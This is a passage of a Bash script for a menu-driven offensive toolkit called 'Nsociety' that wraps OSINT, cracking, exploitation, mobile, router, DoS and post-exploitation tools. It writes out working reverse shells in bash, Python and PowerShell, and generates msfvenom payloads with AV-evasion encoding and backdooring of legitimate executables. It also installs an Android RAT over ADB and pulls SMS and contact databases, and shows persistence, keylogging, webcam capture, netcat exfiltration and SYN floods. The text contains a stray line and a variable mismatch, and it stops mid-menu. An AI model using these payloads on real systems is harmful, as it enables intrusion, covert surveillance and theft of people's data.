        echo -e "${RED}[7]${NC} Amass — Subdomain enumeration"
        echo -e "${RED}[8]${NC} Sublist3r — Subdomain scanner"
        echo -e "${RED}[9]${NC} Subfinder — Fast passive subdomain"
        echo -e "${RED}[10]${NC} Httpx — Probe subdomains (live check)"
        echo -e "${RED}[11]${NC} Twint — Twitter scraping (no API)"
        echo -e "${RED}[12]${NC} Shodan — Internet device search"
        echo -e "${RED}[13]${NC} Social Engineering Toolkit (SET)"
        echo -e "${RED}[14]${NC} Creepy — Geolocation OSINT"
        echo -e "${RED}[15]${NC} Censys — Internet scan database"
        echo -e "${RED}[16]${NC} Holtz — Email/User/Phone Lookup"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>OSINT]${NC} Select: "
        read choice

        case $choice in
            1)
                echo -ne "${YELLOW}Domain: ${NC}"; read domain
                theharvester -d "$domain" -b all
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                recon-ng
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                maltego &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                cd /opt/spiderfoot 2>/dev/null && python3 sf.py -l 127.0.0.1:5001 &
                echo -e "${GREEN}[+] Access at http://127.0.0.1:5001${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -ne "${YELLOW}Username: ${NC}"; read user
                cd /opt/sherlock 2>/dev/null && python3 sherlock.py "$user"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo -ne "${YELLOW}Phone (e.g., +1234567890): ${NC}"; read phone
                phoneinfoga -n "$phone" -s all
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                echo -ne "${YELLOW}Domain: ${NC}"; read domain
                amass enum -d "$domain"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            8)
                echo -ne "${YELLOW}Domain: ${NC}"; read domain
                cd /opt/Sublist3r 2>/dev/null && python3 sublist3r.py -d "$domain"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            9)
                echo -ne "${YELLOW}Domain: ${NC}"; read domain
                subfinder -d "$domain"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            10)
                echo -ne "${YELLOW}File with subdomains (one per line): ${NC}"; read file
                cat "$file" | httpx -title -status-code
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            11)
                echo -ne "${YELLOW}Twitter username: ${NC}"; read user
                cd /opt/twint 2>/dev/null && python3 -m twint -u "$user" || python3 -m twint -u "$user"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            12)
                echo -e "${CYAN}Visit https://www.shodan.io in your browser${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            13)
                sudo setoolkit
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            14)
                creepy &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            15)
                echo -e "${CYAN}Visit https://censys.io in your browser${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            16)
                echo -ne "${YELLOW}Email/Username: ${NC}"; read query
                cd /opt/holtz 2>/dev/null && python3 holtz.py -q "$query" || echo "Holtz not found"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


password_cracking_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  PASSWORD CRACKING${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} Hashcat — GPU hash cracking"
        echo -e "${RED}[2]${NC} John the Ripper — CPU hash cracking"
        echo -e "${RED}[3]${NC} Hydra — Network service brute force"
        echo -e "${RED}[4]${NC} Medusa — Parallel network brute force"
        echo -e "${RED}[5]${NC} Crunch — Custom wordlist generator"
        echo -e "${RED}[6]${NC} CeWL — Scrape website for wordlist"
        echo -e "${RED}[7]${NC} RSMangler — Wordlist mutation"
        echo -e "${RED}[8]${NC} Hash Identifier — Detect hash type"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Password]${NC} Select: "
        read choice

        case $choice in
            1)
                echo -e "${CYAN}Hash types:${NC}"
                echo "  0 = MD5 | 100 = SHA1 | 1400 = SHA256 | 22000 = WPA2 | 3200 = bcrypt"
                echo -ne "${YELLOW}Hash mode (-m): ${NC}"; read mode
                echo -ne "${YELLOW}Hash file path: ${NC}"; read hashfile
                echo -ne "${YELLOW}Wordlist (default: rockyou): ${NC}"; read wordlist
                [ -z "$wordlist" ] && wordlist="/usr/share/wordlists/rockyou.txt"
                hashcat -m "$mode" "$hashfile" "$wordlist"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                echo -ne "${YELLOW}Hash file path: ${NC}"; read hashfile
                echo -ne "${YELLOW}Wordlist (optional): ${NC}"; read wordlist
                [ -n "$wordlist" ] && john --wordlist="$wordlist" "$hashfile" || john "$hashfile"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                echo -e "${CYAN}Services: ssh, ftp, http-post-form, rdp, mysql, smb${NC}"
                echo -ne "${YELLOW}Service: ${NC}"; read service
                echo -ne "${YELLOW}Target IP: ${NC}"; read target
                echo -ne "${YELLOW}Username: ${NC}"; read user
                hydra -l "$user" -P /usr/share/wordlists/rockyou.txt "$service://$target"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                echo -ne "${YELLOW}Service (ssh/ftp/telnet): ${NC}"; read service
                echo -ne "${YELLOW}Target: ${NC}"; read target
                echo -ne "${YELLOW}Username: ${NC}"; read user
                medusa -h "$target" -u "$user" -P /usr/share/wordlists/rockyou.txt -M "$service"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -ne "${YELLOW}Min length: ${NC}"; read min
                echo -ne "${YELLOW}Max length: ${NC}"; read max
                echo -ne "${YELLOW}Charset (e.g., abcdefgh123): ${NC}"; read chars
                echo -ne "${YELLOW}Output file: ${NC}"; read out
                crunch "$min" "$max" "$charset" -o "$out"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo -ne "${YELLOW}URL: ${NC}"; read url
                echo -ne "${YELLOW}Output file: ${NC}"; read out
                cewl "$url" -w "$out"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                echo -ne "${YELLOW}Input wordlist: ${NC}"; read input
                echo -ne "${YELLOW}Output: ${NC}"; read out
                rsmangler -f "$input" -o "$out"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            8)
                echo -ne "${YELLOW}Hash: ${NC}"; read hash
                echo "$hash" | hash-identifier 2>/dev/null || python3 -c "
import sys
h = sys.argv[1]
l = len(h)
print(f'Hash: {h}')
print(f'Length: {l}')
if l == 32: print('Likely: MD5')
elif l == 40: print('Likely: SHA1')
elif l == 56: print('Likely: SHA224')
elif l == 64: print('Likely: SHA256')
elif l == 96: print('Likely: SHA384')
elif l == 128: print('Likely: SHA512')
elif h.startswith('\$2'): print('Likely: bcrypt')
elif h.startswith('\$1'): print('Likely: MD5 crypt')
elif h.startswith('\$5'): print('Likely: SHA256 crypt')
elif h.startswith('\$6'): print('Likely: SHA512 crypt')
else: print('Unknown format')
" "$hash"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


exploitation_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  EXPLOITATION FRAMEWORKS${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} Metasploit (msfconsole) — Interactive"
        echo -e "${RED}[2]${NC} Metasploit Multi-Handler — Listen for shells"
        echo -e "${RED}[3]${NC} SearchSploit — Search exploit database"
        echo -e "${RED}[4]${NC} RouterSploit — Router/IoT exploitation"
        echo -e "${RED}[5]${NC} Sn1per — Auto vulnerability scanner"
        echo -e "${RED}[6]${NC} Findsploit — Find exploits by keyword"
        echo -e "${RED}[7]${NC} Nuclei — Template-based vuln scanning"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Exploit]${NC} Select: "
        read choice

        case $choice in
            1)
                sudo msfconsole
                ;;
            2)
                echo -ne "${YELLOW}Payload (e.g., windows/meterpreter/reverse_tcp): ${NC}"; read payload
                echo -ne "${YELLOW}LHOST: ${NC}"; read lhost
                echo -ne "${YELLOW}LPORT: ${NC}"; read lport
                sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit"
                ;;
            3)
                echo -ne "${YELLOW}Search term: ${NC}"; read term
                searchsploit "$term"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                cd /opt/routersploit 2>/dev/null && python3 rsf.py || echo -e "${RED}RouterSploit not found${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -ne "${YELLOW}Target: ${NC}"; read target
                sniper -t "$target"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                cd /opt/Findsploit 2>/dev/null && bash findsploit || echo -e "${RED}Findsploit not found${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                echo -ne "${YELLOW}Target URL: ${NC}"; read url
                nuclei -u "$url"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}

d
mobile_hacking_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  MOBILE HACKING${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} ADB — Android Debug Bridge (USB)"
        echo -e "${RED}[2]${NC} ADB Screen Recording"
        echo -e "${RED}[3]${NC} ADB Pull All Data (SMS, contacts, photos)"
        echo -e "${RED}[4]${NC} ADB Install RAT Backdoor"
        echo -e "${RED}[5]${NC} MSFVenom Android Payload Generator"
        echo -e "${RED}[6]${NC} PhoneInfoga — Phone Number Intel"
        echo -e "${RED}[7]${NC} Pegasus-Style (CVE-2021-1786) Check"
        echo -e "${RED}[8]${NC} iOS Hacking via Checkra1n/USB"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Mobile]${NC} Select: "
        read choice

        case $choice in
            1)
                echo -e "${CYAN}[*] Checking for ADB devices...${NC}"
                sudo adb devices
                echo -e "\n${CYAN}[*] Connecting...${NC}"
                sudo adb connect 2>/dev/null
                sudo adb shell "echo 'Connected'"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                echo -e "${CYAN}[*] Recording screen (Ctrl+C to stop)...${NC}"
                sudo adb shell screenrecord /sdcard/record.mp4 &
                sleep 30
                sudo adb pull /sdcard/record.mp4 /tmp/
                echo -e "${GREEN}[+] Saved to /tmp/record.mp4${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                echo -e "${CYAN}[*] Pulling SMS...${NC}"
                sudo adb pull /data/data/com.android.providers.telephony/databases/mmssms.db /tmp/ 2>/dev/null
                echo -e "${CYAN}[*] Pulling contacts...${NC}"
                sudo adb pull /data/data/com.android.providers.contacts/databases/contacts2.db /tmp/ 2>/dev/null
                echo -e "${CYAN}[*] Pulling photos...${NC}"
                sudo adb pull /sdcard/DCIM/ /tmp/phone_photos/ 2>/dev/null
                echo -e "${GREEN}[+] Data saved to /tmp/${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                echo -e "${CYAN}[*] Generating Android RAP...${NC}"
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o /tmp/backdoor.apk
                echo -e "${CYAN}[*] Installing on device...${NC}"
                sudo adb install /tmp/backdoor.apk
                echo -e "${GREEN}[+] Backdoor installed! Start handler with option 2 in Exploit menu${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -ne "${YELLOW}LHOST: ${NC}"; read lhost
                echo -ne "${YELLOW}LPORT: ${NC}"; read lport
                echo -e "${CYAN}[*] Generating payload...${NC}"
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /tmp/android_payload.apk
                echo -e "${GREEN}[+] Payload: /tmp/android_payload.apk${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo -ne "${YELLOW}Phone (e.g., +1234567890): ${NC}"; read phone
                phoneinfoga -n "$phone" -s all
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                echo -e "${CYAN}[*] Checking for Pegasus indicators...${NC}"
                echo -e "${CYAN}[*] Pegasus exploits (CVE-2021-1786, CVE-2019-8646) target iMessage${NC}"
                echo -e "${CYAN}[*] On target iPhone: Settings → Privacy → Analytics → Analytics Data${NC}"
                echo -e "${CYAN}[*] Look for: 'sysdiagnose' or abnormal process logs${NC}"
                echo -e "\n${YELLOW}[*] iOS Pegasus detection tool:${NC}"
                echo "   mvt-ios check-ios --ioc /tmp/stix2.json /path/to/backup/"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            8)
                echo -e "${CYAN}[*] iOS checkra1n jailbreak via USB...${NC}"
                echo -e "${CYAN}[1] Run Checkra1n${NC}"
                echo -e "${CYAN}[2] SSH into jailbroken device${NC}"
                read ios_opt
                case $ios_opt in
                    1) sudo checkra1n 2>/dev/null || echo "checkra1n not found" ;;
                    2) ssh root@$(echo -ne "${YELLOW}Device IP: ${NC}" && read ip && echo $ip) ;;
                esac
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


router_iot_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  ROUTER & IOT HACKING${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} RouterSploit — Auto-exploit routers"
        echo -e "${RED}[2]${NC} Router Scan — Default creds + vulns"
        echo -e "${RED}[3]${NC} Hydra Router Login Brute Force"
        echo -e "${RED}[4]${NC} Nmap NSE Scripts for Routers"
        echo -e "${RED}[5]${NC} Default Credential Check"
        echo -e "${RED}[6]${NC} UPnP Exploit Check"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Router]${NC} Select: "
        read choice

        case $choice in
            1)
                cd /opt/routersploit 2>/dev/null && python3 rsf.py || echo -e "${RED}RouterSploit not found${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                echo -ne "${YELLOW}Router IP: ${NC}"; read ip
                nmap -sV -p 80,443,22,23,8080,8443 --script http-default-accounts,http-enum $ip
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                echo -ne "${YELLOW}Router IP: ${NC}"; read ip
                echo -ne "${YELLOW}Service (http-post-form/ssh/telnet): ${NC}"; read svc
                hydra -l admin -P /usr/share/wordlists/rockyou.txt "$svc://$ip"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                echo -ne "${YELLOW}Router IP: ${NC}"; read ip
                nmap -sV -p 1-65535 --script "discovery,safe" $ip
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -ne "${YELLOW}Router IP: ${NC}"; read ip
                echo -e "${CYAN}[*] Trying default credentials...${NC}"
                for cred in "admin:admin" "admin:password" "root:root" "admin:1234" "admin:"; do
                    user=$(echo $cred | cut -d: -f1)
                    pass=$(echo $cred | cut -d: -f2)
                    code=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "http://$ip/" 2>/dev/null)
                    [ "$code" != "401" ] && [ "$code" != "403" ] && [ -n "$code" ] && echo -e "${GREEN}[+] $user:$pass → $code${NC}"
                done
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo -ne "${YELLOW}Router IP: ${NC}"; read ip
                nmap -sU -p 1900 --script upnp-info $ip
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


rat_generation_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  RAT GENERATION — PAYLOADS${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} Windows Reverse Shell (exe)"
        echo -e "${RED}[2]${NC} Linux Reverse Shell (elf)"
        echo -e "${RED}[3]${NC} Android Reverse Shell (apk)"
        echo -e "${RED}[4]${NC} macOS Reverse Shell (macho)"
        echo -e "${RED}[5]${NC} Web Shell (PHP/ASP/JSP)"
        echo -e "${RED}[6]${NC} Python Reverse Shell"
        echo -e "${RED}[7]${NC} Bash Reverse Shell One-Liner"
        echo -e "${RED}[8]${NC} PowerShell Reverse Shell"
        echo -e "${RED}[9]${NC} Stageless Payload (all-in-one)"
        echo -e "${RED}[10]${NC} Encrypted Payload (av evasion)"
        echo -e "${RED}[11]${NC} Veil Framework — AV Evasion"
        echo -e "${RED}[12]${NC} Embed RAT in Legitimate EXE"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>RAT]${NC} Select: "
        read choice

        case $choice in
            1)
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o /tmp/payload.exe
                echo -e "${GREEN}[+] /tmp/payload.exe${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o /tmp/payload.elf
                echo -e "${GREEN}[+] /tmp/payload.elf${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o /tmp/payload.apk
                echo -e "${GREEN}[+] /tmp/payload.apk${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o /tmp/payload.macho
                echo -e "${GREEN}[+] /tmp/payload.macho${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -e "${CYAN}[1] PHP${NC}"
                echo -e "${CYAN}[2] ASP${NC}"
                echo -e "${CYAN}[3] JSP${NC}"
                read webtype
                case $webtype in
                    1) msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -o /tmp/shell.php ;;
                    2) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o /tmp/shell.asp ;;
                    3) msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -o /tmp/shell.jsp ;;
                esac
                echo -e "${GREEN}[+] Generated${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo "# Python reverse shell" > /tmp/shell.py
                echo "import socket,subprocess,os" >> /tmp/shell.py
                echo "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)" >> /tmp/shell.py
                echo "s.connect(('$LHOST',$LPORT))" >> /tmp/shell.py
                echo "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)" >> /tmp/shell.py
                echo "p=subprocess.call(['/bin/sh','-i'])" >> /tmp/shell.py
                echo -e "${GREEN}[+] /tmp/shell.py${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > /tmp/shell.sh
                echo -e "${GREEN}[+] /tmp/shell.sh${NC}"
                echo -e "${CYAN}One-liner: bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            8)
                echo "\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);" > /tmp/shell.ps1
                echo "\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};" >> /tmp/shell.ps1
                echo "while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;" >> /tmp/shell.ps1
                echo "\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);" >> /tmp/shell.ps1
                echo "\$sendback = (iex \$data 2>&1 | Out-String );" >> /tmp/shell.ps1
                echo "\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';" >> /tmp/shell.ps1
                echo "\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> /tmp/shell.ps1
                echo "\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}" >> /tmp/shell.ps1
                echo "\$client.Close()" >> /tmp/shell.ps1
                echo -e "${GREEN}[+] /tmp/shell.ps1${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            9)
                msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o /tmp/stageless.exe
                echo -e "${GREEN}[+] Stageless payload: /tmp/stageless.exe${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            10)
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/encoded_payload.exe
                echo -e "${GREEN}[+] Encrypted: /tmp/encoded_payload.exe${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            11)
                veil
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            12)
                echo -ne "${YELLOW}Path to legitimate exe: ${NC}"; read legit
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -x "$legit" -f exe -o /tmp/backdoored.exe
                echo -e "${GREEN}[+] Backdoored: /tmp/backdoored.exe${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


post_exploitation_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  POST-EXPLOITATION${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} LinPEAS — Linux Privilege Escalation"
        echo -e "${RED}[2]${NC} WinPEAS — Windows Privilege Escalation"
        echo -e "${RED}[3]${NC} Meterpreter Post-Exploitation (via session)"
        echo -e "${RED}[4]${NC} Hashdump + Pass-The-Hash"
        echo -e "${RED}[5]${NC} Keylogging (Meterpreter)"
        echo -e "${RED}[6]${NC} Webcam Snap (Meterpreter)"
        echo -e "${RED}[7]${NC} Screenshot (Meterpreter)"
        echo -e "${RED}[8]${NC} Persistence (Registry/SSH keys/Cron)"
        echo -e "${RED}[9]${NC} Lateral Movement (psexec)"
        echo -e "${RED}[10]${NC} File Exfiltration"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Post]${NC} Select: "
        read choice

        case $choice in
            1)
                if [ -n "$TARGET_IP" ]; then
                    scp /opt/linpeas.sh user@$TARGET_IP:/tmp/ && ssh user@$TARGET_IP "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
                else
                    echo -e "${YELLOW}Run locally: sudo bash /opt/linpeas.sh${NC}"
                    sudo bash /opt/linpeas.sh
                fi
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                echo -e "${CYAN}[*] Use WinPEAS on target Windows machine${NC}"
                echo -e "${CYAN}Upload: /opt/winpeas.exe to target and run${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                echo -ne "${YELLOW}Session ID: ${NC}"; read sid
                sudo msfconsole -q -x "sessions -i $sid"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                echo -e "${CYAN}In Meterpreter session:${NC}"
                echo "  hashdump"
                echo "  run post/windows/gather/smart_hashdump"
                echo -e "\n${CYAN}Pass-The-Hash (psexec):${NC}"
                echo "  use exploit/windows/smb/psexec"
                echo "  set PAYLOAD windows/meterpreter/reverse_tcp"
                echo "  set SMBUser Administrator"
                echo "  set SMBPass LM:NTLMhash"
                echo "  set RHOSTS target"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -e "${CYAN}In Meterpreter session:${NC}"
                echo "  keyscan_start"
                echo "  keyscan_dump"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo -e "${CYAN}In Meterpreter session:${NC}"
                echo "  webcam_list"
                echo "  webcam_snap"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                echo -e "${CYAN}In Meterpreter session:${NC}"
                echo "  screenshot"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            8)
                echo -e "${CYAN}Persistence methods:${NC}"
                echo -e "${CYAN}[1] Registry (Windows)${NC}"
                echo -e "${CYAN}[2] SSH authorized_keys${NC}"
                echo -e "${CYAN}[3] Cron job (Linux)${NC}"
                read pers
                case $pers in
                    1) echo "run persistence -X -i 5 -p $LPORT -r $LHOST" ;;
                    2) echo "cat ~/.ssh/id_rsa.pub | ssh user@target 'cat >> ~/.ssh/authorized_keys'" ;;
                    3) echo "(crontab -l 2>/dev/null; echo '*/5 * * * * /path/to/payload') | crontab -" ;;
                esac
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            9)
                echo -e "${CYAN}Lateral movement with psexec:${NC}"
                echo "  use exploit/windows/smb/psexec"
                echo "  set RHOSTS next_target"
                echo "  set SMBUser Administrator"
                echo "  set SMBPass password"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            10)
                echo -e "${CYAN}File exfiltration:${NC}"
                echo "  download /path/to/file /local/path"
                echo "  upload /local/path /remote/path"
                echo -e "\n${CYAN}Netcat:${NC}"
                echo "  Target: nc -lvp 8888 < file.zip"
                echo "  You:    nc target_ip 8888 > file.zip"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}

	
dos_ddos_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}             DOS/DDOS${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} MDK4 Deauth Flood (WiFi)"
        echo -e "${RED}[2]${NC} MDK4 Beacon Flood"
        echo -e "${RED}[3]${NC} Bettercap Deauth"
        echo -e "${RED}[4]${NC} Hping3 SYN Flood"
        echo -e "${RED}[5]${NC} Slowloris (HTTP Keep-Alive DoS)"
        echo -e "${RED}[6]${NC} GoldenEye — HTTP DoS Tool"
        echo -e "${RED}[7]${NC} THC-SSL-DOS — SSL Re-negotiation DoS"
                echo -e "${RED}[8]${NC} Nmap NSE DoS Scripts"
                echo -e "${RED}[9]${NC} LOIC — Low Orbit Ion Cannon (CLI)"
                echo -e "${RED}[10]${NC} THC-IPv6 — IPv6 Flood Attacks"
                echo -e "${RED}[0]${NC} Back"
                echo ""
                echo -ne "${BOLD}${GREEN}[Nsociety>DoS]${NC} Select: "
                read choice

                case $choice in
                    1)
                        echo -ne "${YELLOW}Target BSSID: ${NC}"; read bssid
                        sudo mdk4 ${WIFI_INTERFACE}mon d -a $bssid
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    2)
                        echo -ne "${YELLOW}Channel: ${NC}"; read ch
                        sudo mdk4 ${WIFI_INTERFACE}mon b -c $ch
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    3)
                        echo -ne "${YELLOW}Target MAC: ${NC}"; read mac
                        sudo bettercap -eval "wifi.deauth $mac"
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    4)
                        [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                        sudo hping3 -S --flood -V -p 80 $TARGET_IP
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    5)
                        [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                        echo -e "${CYAN}[*] Running Slowloris...${NC}"
